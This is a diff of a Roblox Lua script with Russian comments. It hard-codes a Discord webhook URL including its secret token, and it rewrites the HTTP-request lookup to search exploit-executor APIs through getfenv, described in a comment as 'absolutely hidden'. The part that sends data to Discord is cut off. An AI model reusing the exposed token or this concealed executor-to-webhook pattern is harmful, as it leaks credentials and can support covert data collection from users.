@@ -19,21 +19,16 @@ local Debris = game:GetService("Debris")
 -- =========================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1512740729603096769/Ti0GBHAx6aqBVw0fRbHuf9e6AIaY3FGSd9YVDbvL7iC24sqOoWZN6uakmDf-zubzPzkn"
 
--- Безопасный поиск функции запроса, который точно не вызовет краш
-local requestFunc = nil
+-- Абсолютно скрытая и безопасная проверка среды через getfenv
+local env = getfenv()
+local requestFunc = env.request or env.http_request
 
-if typeof(request) == "function" then
-    requestFunc = request
-elseif typeof(http_request) == "function" then
-    requestFunc = http_request
-elseif _G.request then
-    requestFunc = _G.request
-elseif typeof(syn) == "table" and syn.request then
-    requestFunc = syn.request
-elseif typeof(http) == "table" and http.request then
-    requestFunc = http.request
-elseif typeof(fluxus) == "table" and fluxus.request then
-    requestFunc = fluxus.request
+if not requestFunc then
+    -- Проверяем сложные таблицы внутри окружения, если они есть
+    if env.syn and type(env.syn) == "table" then requestFunc = env.syn.request
+    elseif env.http and type(env.http) == "table" then requestFunc = env.http.request
+    elseif env.fluxus and type(env.fluxus) == "table" then requestFunc = env.fluxus.request
+    end
 end
 
 local function SendToDiscord(webhookUrl, data)
